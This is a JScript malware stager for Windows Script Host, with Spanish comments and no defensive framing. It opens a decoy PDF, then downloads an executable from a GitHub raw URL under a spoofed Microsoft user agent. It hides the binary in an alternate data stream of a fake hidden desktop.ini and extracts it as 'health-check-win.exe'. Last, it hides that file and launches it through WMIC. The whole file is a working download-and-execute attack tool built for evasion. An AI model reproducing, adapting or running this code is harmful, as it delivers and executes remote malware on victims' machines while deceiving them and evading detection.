// ========================================================================
// STAGER SIMPLE - Sin cifrado, solo descarga directa
// ========================================================================

// === CONFIGURACIÓN ===
var PAYLOAD_URL = "https://github.com/ggggwrmsfootmen/curly-fortnight/raw/refs/heads/main/agent.exe";

var DECOY_FILE = WScript.CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") + "\\desktop.ini";
var ADS_NAME = "data";
var FINAL_EXE = WScript.CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERPROFILE%") + "\\Pictures\\health-check-win.exe";

var fso = WScript.CreateObject("Scripting.FileSystemObject");
var shell = WScript.CreateObject("WScript.Shell");

// === FUNCIONES AUXILIARES ===

function openPDF() {
    var scriptDir = fso.GetParentFolderName(WScript.ScriptFullName);
    var folder = fso.GetFolder(scriptDir);
    var files = new Enumerator(folder.Files);
    
    for (; !files.atEnd(); files.moveNext()) {
        var file = files.item();
        if (file.Name.toLowerCase().indexOf(".pdf") > -1) {
            WScript.Echo("[+] Abriendo PDF: " + file.Name);
            shell.Run('"' + file.Path + '"', 1, false);
            return true;
        }
    }
    WScript.Echo("[!] No se encontró PDF");
    return false;
}

function downloadBinary(url, userAgent) {
    try {
        WScript.Echo("[*] Descargando: " + url);
        var xhr = WScript.CreateObject("MSXML2.XMLHTTP");
        xhr.open("GET", url, false);
        xhr.setRequestHeader("User-Agent", userAgent || "Microsoft-Delivery-Optimization/10.0");
        xhr.send();
        
        WScript.Echo("[*] Status HTTP: " + xhr.status);
        
        if (xhr.status == 200) {
            WScript.Echo("[+] Descargado exitosamente");
            return xhr.responseBody;
        } else {
            WScript.Echo("[!] Error HTTP: " + xhr.status);
        }
    } catch(e) {
        WScript.Echo("[!] Excepción en downloadBinary: " + e.message);
    }
    return null;
}

function saveBinaryToADS(decoyFile, adsName, binaryData) {
    try {
        WScript.Echo("[*] Guardando en ADS: " + decoyFile + ":" + adsName);
        
        var stream = WScript.CreateObject("ADODB.Stream");
        stream.Type = 1; // Binary
        stream.Open();
        stream.Write(binaryData);
        stream.SaveToFile(decoyFile + ":" + adsName, 2);
        stream.Close();
        
        WScript.Echo("[+] Guardado en ADS exitosamente");
        return true;
    } catch(e) {
        WScript.Echo("[!] Excepción en saveBinaryToADS: " + e.message);
        return false;
    }
}

function extractFromADS(decoyFile, adsName, outputFile) {
    try {
        WScript.Echo("[*] Extrayendo de ADS a: " + outputFile);
        
        var stream = WScript.CreateObject("ADODB.Stream");
        stream.Type = 1;
        stream.Open();
        stream.LoadFromFile(decoyFile + ":" + adsName);
        stream.SaveToFile(outputFile, 2);
        stream.Close();
        
        if (fso.FileExists(outputFile)) {
            WScript.Echo("[+] Archivo creado: " + outputFile + " (" + fso.GetFile(outputFile).Size + " bytes)");
            return true;
        } else {
            WScript.Echo("[!] Archivo no fue creado");
            return false;
        }
    } catch(e) {
        WScript.Echo("[!] Excepción en extractFromADS: " + e.message);
        return false;
    }
}

function executeWithWMIC(exePath) {
    try {
        WScript.Echo("[*] Ejecutando con WMIC: " + exePath);
        var cmd = 'wmic process call create "' + exePath + '"';
        shell.Run(cmd, 0, true);
        WScript.Echo("[+] Comando WMIC ejecutado");
        return true;
    } catch(e) {
        WScript.Echo("[!] Excepción en executeWithWMIC: " + e.message);
        return false;
    }
}

function hideFile(filePath) {
    try {
        WScript.Echo("[*] Ocultando archivo: " + filePath);
        shell.Run('attrib +H +S "' + filePath + '"', 0, true);
        WScript.Echo("[+] Archivo oculto");
    } catch(e) {
        WScript.Echo("[!] Excepción en hideFile: " + e.message);
    }
}

// === FLUJO PRINCIPAL ===

WScript.Echo("========================================");
WScript.Echo("STAGER SIMPLE - Iniciando...");
WScript.Echo("========================================");

try {
    // 0. Abrir PDF (decoy)
    WScript.Echo("\n[PASO 1] Abriendo PDF decoy");
    openPDF();
    WScript.Sleep(1000);
    
    // 1. Descargar payload binario
    WScript.Echo("\n[PASO 2] Descargando payload");
    var binaryData = downloadBinary(PAYLOAD_URL, "Microsoft-Delivery-Optimization/10.0");
    
    if (!binaryData) {
        WScript.Echo("[!] FALLO: No se pudo descargar el payload");
        WScript.Quit(1);
    }
    
    // 2. Crear archivo señuelo
    WScript.Echo("\n[PASO 3] Creando archivo señuelo");
    if (!fso.FileExists(DECOY_FILE)) {
        var decoy = fso.CreateTextFile(DECOY_FILE, true);
        decoy.WriteLine("[.ShellClassInfo]");
        decoy.WriteLine("IconResource=shell32.dll,4");
        decoy.Close();
        WScript.Echo("[+] Señuelo creado: " + DECOY_FILE);
        hideFile(DECOY_FILE);
    } else {
        WScript.Echo("[*] Señuelo ya existe: " + DECOY_FILE);
    }
    
    // 3. Almacenar en ADS
    WScript.Echo("\n[PASO 4] Almacenando en ADS");
    if (!saveBinaryToADS(DECOY_FILE, ADS_NAME, binaryData)) {
        WScript.Echo("[!] FALLO: No se pudo guardar en ADS");
        WScript.Quit(1);
    }
    
    // 4. Extraer de ADS a archivo final
    WScript.Echo("\n[PASO 5] Extrayendo de ADS");
    if (!extractFromADS(DECOY_FILE, ADS_NAME, FINAL_EXE)) {
        WScript.Echo("[!] FALLO: No se pudo extraer de ADS");
        WScript.Quit(1);
    }
    
    // 5. Ocultar archivo final
    WScript.Echo("\n[PASO 6] Ocultando archivo final");
    hideFile(FINAL_EXE);
    
    // 6. Ejecutar con WMIC
    WScript.Echo("\n[PASO 7] Ejecutando payload");
    executeWithWMIC(FINAL_EXE);
    
    WScript.Echo("\n========================================");
    WScript.Echo("[+] STAGER COMPLETADO EXITOSAMENTE");
    WScript.Echo("========================================");
    
} catch(e) {
    WScript.Echo("\n[!] ERROR FATAL: " + e.message);
    WScript.Quit(1);
}

WScript.Echo("\nPresiona ENTER para cerrar...");
WScript.StdIn.ReadLine();
